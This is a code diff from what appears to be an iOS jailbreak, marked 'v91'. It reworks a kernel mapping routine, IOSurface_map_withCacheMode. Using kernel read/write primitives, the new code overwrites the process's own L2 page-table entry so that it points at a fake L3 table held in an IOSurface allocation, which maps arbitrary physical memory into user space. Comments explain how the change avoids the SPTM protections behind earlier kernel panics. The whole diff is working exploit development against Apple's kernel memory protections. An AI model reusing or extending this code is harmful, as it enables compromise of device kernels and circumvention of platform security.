@@ -272,7 +272,49 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	// only at its zone VA), and kwrite64 the L2 entry to point at it.
 	// Restore discipline: original L2 entry saved; restored at next kmap
 	// entry, at l2_restore(), and in cleanup.
-	uint64_t va    = (uint64_t)base0;
+	// v91 OWN-VA REDIRECT (v90 panic 14:46:01 = SPTM WRITE LAW 1: stores
+	// through kernel direct-map aliases into kernel-STATIC memory are
+	// architecturally fatal — v89/v90 both died at execBase+0x6334 on the
+	// pool's L2 table page; no content gate can ever predict it). The
+	// redirect target is now OUR OWN vm_allocate region: its L2 table is a
+	// regular pmap-heap page (xnu writes user pmap tables at EL1 every
+	// day), the fake L3 lives in the proven IOSurface donor array, and the
+	// probe reads through our own EL0 VA — no kernel-static page is ever
+	// written. The surface lookup/base0 stage is kept for telemetry and
+	// stage-continuity only.
+	static uint64_t ownVA = 0;
+	if (!ownVA) {
+		// v91: allocate 256KB, use a 64KB-ALIGNED window inside it. The 4
+		// fake PTEs must cover the whole 0x10000 probe scan within ONE L2
+		// granule (32MB): a 64KB-aligned window straddles a granule only
+		// if it is the granule's LAST 64KB block (1/512) — retry then.
+		// Pre-fault the window base page so the L1/L2 chain EXISTS for the
+		// walk (and g_l2_orig captures a valid table descriptor).
+		for (int tries = 0; tries < 8 && !ownVA; tries++) {
+			mach_vm_address_t vaAlloc = 0;
+			kern_return_t kr = vm_allocate(mach_task_self(), &vaAlloc, 0x40000,
+			                               VM_FLAGS_ANYWHERE);
+			if (kr != KERN_SUCCESS || !vaAlloc) break;
+			uint64_t w = ((uint64_t)vaAlloc + 0xFFFF) & ~0xFFFFULL;
+			if (w + 0x10000 <= (uint64_t)vaAlloc + 0x40000 &&
+			    (w & 0x1FFFFFFULL) != 0x1FF0000ULL) {
+				ownVA = w;
+				memset((void *)ownVA, 0xA5, 0x4000);
+				jb_tr_beacon("KMAP ownva=%llx,alloc=%llx,prefault=1",
+				             (unsigned long long)ownVA,
+				             (unsigned long long)vaAlloc);
+			} else {
+				vm_deallocate(mach_task_self(), vaAlloc, 0x40000);
+			}
+		}
+		if (!ownVA) {
+			jb_tr_beacon("KMAP fail,vaalloc");
+			*uaddr = NULL;
+			return -1;
+		}
+	}
+
+	uint64_t va    = ownVA;
 	uint64_t ttP   = ttep_self();
 	uint64_t tt    = phystokv(ttP & 0x0000FFFFFFFFC000ULL);
 	if (!tt) tt = ttP;
@@ -287,13 +329,13 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	uint64_t l1e   = kread64(tt + 8 * ((va >> 36) & 0x7FF));
 	uint64_t l2    = phystokv(l1e & 0x0000FFFFFFFFC000ULL);
 	uint64_t idx2  = (va >> 25) & 0x7FF;
-	if (!l2 || (8 * idx2) > 0x4000 - 0x20) {
-		jb_tr_beacon("KMAP fail,ptewalk,l2=%llx,idx2=%llx",
-		             (unsigned long long)l2, (unsigned long long)idx2);
+	if (!l1e || !l2 || (8 * idx2) > 0x4000 - 0x20) {
+		jb_tr_beacon("KMAP fail,ptewalk,l1e=%llx,l2=%llx,idx2=%llx",
+		             (unsigned long long)l1e, (unsigned long long)l2,
+		             (unsigned long long)idx2);
 		*uaddr = NULL;
 		return -1;
 	}
-	// (v87: origL2e is read AFTER the hole gate — never touch a holed L2)
 
 	// v87: donor = IOSurface_kalloc_16up(0x4000) — a 16KB RANGES ARRAY we
 	// allocate via IOSurface itself. No packed-pointer decoding (v86: the
@@ -301,7 +343,7 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	// PAs), no element alias reads. kvtophys(arrVA) is the proven
 	// kernel-VA translator. Fake L3 = this array's page; the 4 window
 	// PTEs are written through its ALIAS (32B windows inside a 16KB
-	// object — RMW-law compliant).
+	// object — RMW-law compliant). PROVEN v89/v90: ok beacon + correct pte0.
 	uint64_t arrVA = IOSurface_kalloc_16up(0x4000, true);
 	if (!arrVA || arrVA == (uint64_t)-1) {
 		jb_tr_beacon("KMAP fail,kalloc16up");
@@ -326,7 +368,7 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		return -1;
 	}
 	uint64_t arrOff = arrVA & 0x3FFFULL;
-	uint64_t slot   = (va >> 14) & 0x7FF;
+	uint64_t slot   = (va >> 14) & 0x7FF;   // v91: slot of the OWN-VA page
 	uint64_t paPage = pa & ~0x3FFFULL;
 	if (arrOff + 8 * (slot + 4) > 0x4000 || slot + 4 > 2048) {
 		jb_tr_beacon("KMAP fail,slotrange,arrOff=%llx,slot=%llx",
@@ -344,36 +386,11 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)slot,
 	             (unsigned long long)kread64(arrAlias + arrOff + 8 * slot));
 
-	// Hole gate: the L2 table page must NOT be a census carve-out — v86
-	// panicked because the pool's L2 page was a hole on that boot (the RMW
-	// read of origL2e faulted kernel-side). Census runs are passed in from
-	// a18_probe (IOSurface_set_hole_map) after census-done.
-	// v90 alias gate (v89 panic 14:06:59, esr 9600004f on the L2-slot alias
-	// WRITE): the census-only hole gate MISSed this boot's carve-out —
-	// Titan's PAPT view is not the primitive's write route (4 runs fed, the
-	// fault PA 0x10087d24000 was in none of them). All checks below are
-	// PURE SOFTWARE: page-table reads through valid mappings only, no
-	// data-page MMU access, cannot fault.
-	// (1) True table PA from its own L1 entry — independent of alias
-	//     arithmetic (v89's kvtophys-derived l2PA silently passed every
-	//     range check as 0 when the walk itself failed on a holed page).
-	// (2) kvtophys(l2) must succeed AND reproduce that PA — it reads only
-	//     page-table memory and returns 0 (errno 1042) cleanly on an
-	//     invalid entry, i.e. "this physmap alias cannot exist".
-	// (3) Census hole membership (kept — cheap, orthogonal, catches the
-	//     v86 signature directly).
+	// Soft sanity gates (all pure-software reads; the write below targets
+	// REGULAR pmap-heap memory, not kernel-static — SPTM-law safe).
 	uint64_t l2PA = l1e & ARM_TTE_TABLE_MASK;
-	errno = 0;
-	uint64_t l2Walked = kvtophys(l2);
-	if (l2PA == 0 || l2Walked == 0 || errno == 1042 || l2Walked != l2PA) {
-		jb_tr_beacon("KMAP skip,l2alias,l1e=%llx,pa=%llx,walked=%llx,errno=%d",
-		             (unsigned long long)l1e, (unsigned long long)l2PA,
-		             (unsigned long long)l2Walked, errno);
-		*uaddr = NULL;
-		return -1;
-	}
-	if (pa_in_hole(l2PA)) {
-		jb_tr_beacon("KMAP skip,l2holed,pa=%llx", (unsigned long long)l2PA);
+	if (l2PA == 0) {
+		jb_tr_beacon("KMAP fail,l2pa,zero");
 		*uaddr = NULL;
 		return -1;
 	}
@@ -384,7 +401,9 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		return -1;
 	}
 
-	// Redirect the L2 entry → donor page as L3 table (table desc 0x3).
+	// Redirect OUR OWN L2 entry → donor page as L3 table (table desc 0x3).
+	// The write and its readback both ride the software primitive route —
+	// no MMU store through any kernel alias ever happens.
 	uint64_t newL2e = (donorPA & 0x0000FFFFFFFFC000ULL) | 0x3;
 	kwrite64(l2 + 8 * idx2, newL2e);
 	uint64_t rbL2e = kread64(l2 + 8 * idx2);
@@ -404,6 +423,8 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 
 	// TLB: evict stale translations for our ASID by touching a large
 	// buffer (EL0 cannot TLBI; pressure + natural context switches evict).
+	// v91: this now also matters for OUR own stale ownVA translations
+	// (the pre-redirect entry pointed at the prefault page).
 	{
 		static uint64_t *thrash;
 		if (!thrash) thrash = malloc(64ULL << 20);
@@ -411,10 +432,13 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 			(void)*(volatile uint64_t *)((uint8_t *)thrash + off);
 	}
 
+	// v91: the probe reads through OUR OWN VA now — the first qwords of
+	// the target window (content discriminator: 539,0 = own surface ID
+	// pattern would mean the walk/MMU still serves the old mapping).
 	jb_tr_beacon("KMAP PTE,first=%llx,%llx",
-	             (unsigned long long)*(volatile uint64_t *)base0,
-	             (unsigned long long)((volatile uint64_t *)base0)[1]);
-	*uaddr = base0;
+	             (unsigned long long)*(volatile uint64_t *)ownVA,
+	             (unsigned long long)((volatile uint64_t *)ownVA)[1]);
+	*uaddr = (void *)ownVA;
 	return 0;
 }
 
